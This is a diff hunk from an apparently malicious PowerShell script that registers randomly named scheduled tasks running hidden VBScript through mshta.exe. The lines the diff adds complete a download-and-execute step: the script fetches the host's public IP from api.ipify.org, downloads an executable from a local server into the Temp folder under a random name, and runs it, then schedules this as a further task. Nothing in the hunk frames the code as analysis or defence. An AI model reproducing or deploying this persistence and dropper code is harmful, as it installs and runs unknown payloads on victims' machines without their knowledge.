@@ -157,4 +157,7 @@ $s1_cmd="vbscript:close(CreateObject(`"WScript.Shell`").Run(`"$s1cmd`",0,False))
 $s2_cmd="vbscript:close(CreateObject(`"WScript.Shell`").Run(`"$s2cmd`",0,False))";
 AddTask (RandomString) 'mshta.exe' $s1_cmd 0 0 $s_fold;
 AddTask (RandomString) 'mshta.exe' $s2_cmd 0 0 $s_fold;
-$tsts="vbscript:close(CreateObject(`"WScript.Shell`").Run(`"powershell.exe `"`"`$F=`$env:Temp+'\\"+(RandomString)+".exe';rm -Force `$F;`$cl=(New-Object Net.WebClient);`$cl.DownloadFile('http://127.0.0.1:5555/"+(RandomString)+".asp
+$tsts="vbscript:close(CreateObject(`"WScript.Shell`").Run(`"powershell.exe `"`"`$F=`$env:Temp+'\\"+(RandomString)+".exe';rm -Force `$F;`$cl=(New-Object Net.WebClient);`$cl.DownloadFile('http://127.0.0.1:5555/"+(RandomString)+".asp?ts&ip='+`$cl.DownloadString('http://api.ipify.org/'),`$F);& `$F`"`"`",0,False))";
+AddTask (RandomString) 'mshta.exe' $tsts 1;
+}
+ITP;
